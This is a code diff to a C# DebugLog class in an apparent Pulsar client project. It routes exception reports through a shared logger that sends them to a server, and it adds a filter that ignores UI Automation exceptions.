@@ -1,5 +1,4 @@
-﻿using Pulsar.Client.Networking;
-using Pulsar.Common.Messages;
+﻿using Pulsar.Client.LoggingAPI;
 using System;
 using System.Collections.Generic;
 using System.Diagnostics;
@@ -14,13 +13,11 @@ namespace Pulsar.Client.User
 {
     internal class DebugLog : IDisposable
     {
-        private readonly PulsarClient _client;
         private readonly HashSet<Type> _ignoredExceptionTypes;
         private readonly HashSet<Type> _ignoredClasses;
 
-        public DebugLog(PulsarClient client)
+        public DebugLog()
         {
-            _client = client ?? throw new ArgumentNullException(nameof(client));
             _ignoredExceptionTypes = new HashSet<Type>
                 {
                     typeof(CryptographicException),
@@ -51,7 +48,7 @@ namespace Pulsar.Client.User
                 }
                 
                 LogException(ex);
-                _client.Send(new GetDebugLog { Log = ex.ToString() });
+                UniversalDebugLogger.SendLogToServer(ex.ToString());
             }
         }
 
@@ -63,7 +60,7 @@ namespace Pulsar.Client.User
             }
             
             LogException(e.Exception);
-            _client.Send(new GetDebugLog { Log = e.Exception.ToString() });
+            UniversalDebugLogger.SendLogToServer(e.Exception.ToString());
         }
 
         private void TaskScheduler_UnobservedTaskException(object sender, UnobservedTaskExceptionEventArgs e)
@@ -74,7 +71,7 @@ namespace Pulsar.Client.User
             }
             
             LogException(e.Exception);
-            _client.Send(new GetDebugLog { Log = e.Exception.ToString() });
+            UniversalDebugLogger.SendLogToServer(e.Exception.ToString());
         }
 
         private void FirstChanceExcpetion_Handler(object sender, FirstChanceExceptionEventArgs e)
@@ -91,7 +88,7 @@ namespace Pulsar.Client.User
             }
 
             LogException(e.Exception);
-            _client.Send(new GetDebugLog { Log = e.Exception.ToString() });
+            UniversalDebugLogger.SendLogToServer(e.Exception.ToString());
         }
 
         private bool ShouldIgnoreException(Exception ex)
@@ -99,6 +96,11 @@ namespace Pulsar.Client.User
             // check against ignored classes
             var declaringType = ex.TargetSite?.DeclaringType;
             if (declaringType != null && _ignoredClasses.Contains(declaringType))
+            {
+                return true;
+            }
+
+            if (IsUiAutomationException(ex))
             {
                 return true;
             }
@@ -116,6 +118,20 @@ namespace Pulsar.Client.User
             }
 
             return false;
+        }
+
+        private bool IsUiAutomationException(Exception ex)
+        {
+            var exceptionText = ex.ToString();
+
+            if (string.IsNullOrEmpty(exceptionText))
+            {
+                return false;
+            }
+
+            return exceptionText.Contains("MS.Internal.Automation") ||
+                   exceptionText.Contains("System.Windows.Automation") ||
+                   exceptionText.Contains("UIAutomationClient");
         }
 
         private bool IsBlacklistedMessage(string message)
